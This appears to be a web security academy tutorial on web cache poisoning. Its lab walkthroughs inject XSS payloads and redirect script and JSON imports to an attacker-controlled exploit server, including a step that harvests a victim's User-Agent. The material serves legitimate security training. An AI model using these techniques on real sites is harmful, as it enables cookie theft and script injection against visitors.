# Exploiting cache design flaws

Websites are vulnerable to web cache poisoning if they handle unkeyed input in an unsafe way and allow the subsequent HTTP responses to be cached. This vulnerability can be used as a delivery method for a variety of different attacks.

## Using web cache poisoning to exploit unsafe handling of resource imports

Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead.

If the response containing this malicious URL is cached, the attacker's JavaScript file would be imported and executed in the browser session of any user whose request has a matching cache key.

```
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

### Web cache poisoning with an unkeyed header

This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

**Solution**

1. With Burp running, load the website's home page
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the *GET* request for the home page and send it to Burp Repeater.
3. Add a cache-buster query parameter, such as *?cb=1234*.
4. Add the *X-Forwarded-Host* header with an arbitrary hostname, such as example.com, and send the request.
5. Observe that the *X-Forwarded-Host* header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at */resources/js/tracking.js*.
6. Replay the request and observe that the response contains the header *X-Cache: hit*. This tells us that the response came from the cache.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:

    ```/resources/js/tracking.js```

8. In the body, enter the payload *alert(document.cookie)* and store the exploit.
9. Open the *GET* request for the home page in Burp Repeater and remove the cache buster.
10. Add the following header, remembering to enter your own exploit server ID:

    ```X-Forwarded-Host: your-exploit-server-id.web-security-academy.net```

11. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and *X-Cache: hit* in the headers.
12. To simulate the victim, load the poisoned URL in the browser and make sure that the *alert()* is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
13. If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.

## Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies are often used to dynamically generate content in a response. A common example might be a cookie that indicates the user's preferred language, which is then used to load the corresponding version of the page:

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

In this example, the Polish version of a blog post is being requested. Notice that the information about which language version to serve is only contained in the Cookie header. Let's suppose that the cache key contains the request line and the Host header, but not the Cookie header. In this case, if the response to this request is cached, then all subsequent users who tried to access this blog post would receive the Polish version as well, regardless of which language they actually selected.

This flawed handling of cookies by the cache can also be exploited using web cache poisoning techniques. In practice, however, this vector is relatively rare in comparison to header-based cache poisoning. When cookie-based cache poisoning vulnerabilities exist, they tend to be identified and resolved quickly because legitimate users have accidentally poisoned the cache.

### Web cache poisoning with an unkeyed cookie

This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser.

**Solution**

1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that the first response you received sets the cookie *fehost=prod-cache-01*.
3. Reload the home page and observe that the value from the fehost cookie is reflected inside a double-quoted JavaScript object in the response.
4. Send this request to Burp Repeater and add a cache-buster query parameter.
5. Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.
6. Place a suitable XSS payload in the fehost cookie, for example:

    ```fehost=someString"-alert(1)-"someString```

7. Replay the request until you see the payload in the response and *X-Cache: hit* in the headers.
8. Load the URL in the browser and confirm the *alert()* fires.
9. Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

## Using multiple headers to exploit web cache poisoning vulnerabilities

Some websites are vulnerable to simple web cache poisoning exploits, as demonstrated above. However, others require more sophisticated attacks and only become vulnerable when an attacker is able to craft a request that manipulates multiple unkeyed inputs.

For example, let's say a website requires secure communication using HTTPS. To enforce this, if a request that uses another protocol is received, the website dynamically generates a redirect to itself that does use HTTPS:

```
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```

By itself, this behavior isn't necessarily vulnerable. However, by combining this with what we learned earlier about vulnerabilities in dynamically generated URLs, an attacker could potentially exploit this behavior to generate a cacheable response that redirects users to a malicious URL.

### Web cache poisoning with multiple headers

This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

**Solution**

1. With Burp running, load the website's home page.
2. Go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the *GET* request for the JavaScript file */resources/js/tracking.js* and send it to Burp Repeater.
3. Add a cache-buster query parameter and the *X-Forwarded-Host* header with an arbitrary hostname, such as *example.com*. Notice that this doesn't seem to have any effect on the response.
4. Remove the *X-Forwarded-Host* header and add the *X-Forwarded-Scheme* header instead. Notice that if you include any value other than *HTTPS*, you receive a 302 response. The *Location* header shows that you are being redirected to the same URL that you requested, but using *https://*.
5. Add the *X-Forwarded-Host: example.com* header back to the request, but keep *X-Forwarded-Scheme: nothttps* as well. Send this request and notice that the Location header of the 302 redirect now points to *https://example.com/*.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:

    ``` /resources/js/tracking.js```

7. In the body, enter the payload *alert(document.cookie)* and store the exploit.
8. Go back to the request in Burp Repeater and set the X-Forwarded-Host header as follows, remembering to enter your own exploit server ID:

    ```X-Forwarded-Host: your-exploit-server-id.web-security-academy.net```

9. Make sure the *X-Forwarded-Scheme* header is set to anything other than *HTTPS*.
10. Send the request until you see your exploit server URL reflected in the response and *X-Cache: hit* in the headers.
11. To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in Burp's browser. If the cache was successfully poisoned, you will see the script containing your payload, *alert(document.cookie)*. Note that the *alert()* won't actually execute here.
12. Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again.
13. To simulate the victim, reload the home page in the browser and make sure that the *alert()* fires.
14. Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved.

## Exploiting responses that expose too much information

Sometimes websites make themselves more vulnerable to web cache poisoning by giving away too much information about themselves and their behavior.

**Cache-control directives**

One of the challenges when constructing a web cache poisoning attack is ensuring that the harmful response gets cached. This can involve a lot of manual trial and error to study how the cache behaves. However, sometimes responses explicitly reveal some of the information an attacker needs to successfully poison the cache.
One such example is when responses contain information about how often the cache is purged or how old the currently cached response is:

```
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```

Although this doesn't directly lead to web cache poisoning vulnerabilities, it does save a potential attacker some of the manual effort involved because they know exactly when to send their payload to ensure it gets cached.
This knowledge also enables far more subtle attacks. Rather than bombarding the back-end server with requests until one sticks, which could raise suspicions, the attacker can carefully time a single malicious request to poison the cache.

**Vary header**

The Vary header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed. It is commonly used to specify that the User-Agent header is keyed, for example, so that if the mobile version of a website is cached, this won't be served to non-mobile users by mistake.

This information can also be used to construct a multi-step attack to target a specific subset of users. For example, if the attacker knows that the User-Agent header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected. Alternatively, they could work out which user agent was most commonly used to access the site, and tailor the attack to affect the maximum number of users that way.

### Targeted web cache poisoning using an unknown header

This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

**Solution**

1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the *GET* request for the home page.
3. With the Param Miner extension enabled, right-click on the request and select "Guess headers". After a while, Param Miner will report that there is a secret input in the form of the *X-Host* header.
4. Send the *GET* request to Burp Repeater and add a cache-buster query parameter.
5. Add the *X-Host* header with an arbitrary hostname, such as *example.com*. Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at */resources/js/tracking.js*.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:

    ```/resources/js/tracking.js```

7. In the body, enter the payload *alert(document.cookie)* and store the exploit.
8. Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID:

    ```X-Host: your-exploit-server-id.web-security-academy.net```

9. Send the request until you see your exploit server URL reflected in the response and *X-Cache: hit* in the headers.
10. To simulate the victim, load the URL in the browser and make sure that the *alert()* fires.
11. Notice that the Vary header is used to specify that the *User-Agent* is part of the cache key. To target the victim, you need to find out their *User-Agent*.
12. On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:

```<img src="https://your-exploit-server-id.web-security-academy.net/foo" />```

13. Go to the blog page and double-check that your comment was successfully posted.
14. Go to the exploit server and click the button to open the "Access log". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their *User-Agent* from the log.
15. Go back to your malicious request in Burp Repeater and paste the victim's *User-Agent* into the corresponding header. Remove the cache buster.
16. Keep sending the request until you see your exploit server URL reflected in the response and *X-Cache: hit* in the headers.
17. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved

## Using web cache poisoning to exploit DOM-based vulnerabilities

Many websites use JavaScript to fetch and process additional data from the back-end. If a script handles data from the server in an unsafe way, this can potentially lead to all kinds of DOM-based vulnerabilities.

For example, an attacker could poison the cache with a response that imports a JSON file containing the following payload:

```{"someProperty" : "<svg onload=alert(1)>"}```

If the website then passes the value of this property into a sink that supports dynamic code execution, the payload would be executed in the context of the victim's browser session.

If you use web cache poisoning to make a website load malicious JSON data from your server, you may need to grant the website access to the JSON using CORS:

```
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *

{
    "malicious json" : "malicious json"
}
```

### Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely.

To solve the lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

**Solution**

1. With Burp running, open the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the *GET* request for the home page and send it to Burp Repeater.
3. Use Param Miner to identify that the *X-Forwarded-Host* header is supported.
4. Add a cache buster to the request, as well as the *X-Forwarded-Host* header with an arbitrary hostname, such as *example.com*. Notice that this header overwrites the *data.host* variable, which is passed into the *initGeoLocate()* function.
5. Study the *initGeoLocate()* function in /resources/js/geolocate.js and notice that it is vulnerable to DOM-XSS due to the way it handles the incoming JSON data.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:

    ```/resources/json/geolocate.json```

7. In the head, add the header Access-Control-Allow-Origin: * to enable CORS
8. In the body, add a malicious JSON object that matches the one used by the vulnerable website. However, replace the value with a suitable XSS payload, for example:

    ```
    {
    "country": "<img src=1 onerror=alert(document.cookie) />"
    }
    ```

9. Store the exploit.
10. Back in Burp, find the request for the home page and send it to Burp Repeater.
11. In Burp Repeater, add the following header, remembering to enter your own exploit server ID:

    ```X-Forwarded-Host: your-exploit-server-id.web-security-academy.net```

12. Send the request until you see your exploit server URL reflected in the response and *X-Cache: hit* in the headers.
13. If this doesn't work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set.
14. Send this new request to Burp Repeater and repeat the steps above until you successfully poison the cache.
15. To simulate the victim, load the URL in the browser and make sure that the *alert()* fires.
16. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved

## Chaining web cache poisoning vulnerabilities 

 But the same is also true of different types of attack. Web cache poisoning sometimes requires the attacker to chain together several of the techniques we've discussed. By chaining together different vulnerabilities, it is often possible to expose additional layers of vulnerability that were initially unexploitable.

### Combining web cache poisoning vulnerabilities

This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain.

A user visits the home page roughly once a minute and their language is set to English. To solve this lab, poison the cache with a response that executes *alert(document.cookie)* in the visitor's browser.

**Solution**

This lab requires you to poison the cache with multiple malicious responses simultaneously and coordinate this with the victim's browsing behavior.

1. With Burp running, load the website's home page.
2. Use Param Miner to identify that the *X-Forwarded-Host* and *X-Original-URL* headers are supported.
3. In Burp Repeater, experiment with the *X-Forwarded-Host* header and observe that it can be used to import an arbitrary JSON file instead of the *translations.json* file, which contains translations of UI texts.
4. Notice that the website is vulnerable to DOM-XSS due to the way the *initTranslations()* function handles data from the JSON file for all languages except English.
5. Go to the exploit server and edit the file name to match the path used by the vulnerable website:

    ```/resources/json/translations.json```

6. In the head, add the header *Access-Control-Allow-Origin: ** to enable CORS.
7. In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example:

    ```
    {
        "en": {
            "name": "English"
        },
        "es": {
            "name": "español",
            "translations": {
                "Return to list": "Volver a la lista",
                "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
                "Description:": "Descripción"
            }
        }
    }
    ```

For the rest of this solution we will use Spanish to demonstrate the attack. Please note that if you injected your payload into the translation for another language, you will also need to adapt the examples accordingly.
8. Store the exploit.
9. In Burp, find a *GET* request for */?localized=1* that includes the *lang* cookie for Spanish:

    ```lang=es```

10. Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID:

    ```X-Forwarded-Host: your-exploit-server-id.web-security-academy.net```

11. Send the response and confirm that your exploit server is reflected in the response.
12. To simulate the victim, load the URL in the browser and confirm that the *alert()* fires.
13. You have successfully poisoned the cache for the Spanish page, but the target user's language is set to English. As it's not possible to exploit users with their language set to English, you need to find a way to forcibly change their language.
14. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to */setlang/es*. The user's selected language is set server side using the *lang=es* cookie, and the home page is reloaded with the parameter *?localized=1*.
15. Send the *GET* request for the home page to Burp Repeater and add a cache buster.
16. Observe that the *X-Original-URL* can be used to change the path of the request, so you can explicitly set */setlang/es*. However, you will find that this response cannot be cached because it contains the Set-Cookie header.
17. Observe that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, *X-Original-URL: /setlang\es* triggers a 302 response that redirects to */setlang/es*. Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.
18. You now need to combine these two exploits. First, poison the *GET /?localized=1* page using the *X-Forwarded-Host* header to import your malicious JSON file from the exploit server.
19. Now, while the cache is still poisoned, also poison the *GET /* page using *X-Original-URL: /setlang\es* to force all users to the Spanish page.
20. To simulate the victim, load the English page in the browser and make sure that you are redirected and that the *alert()* fires.
21. Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved.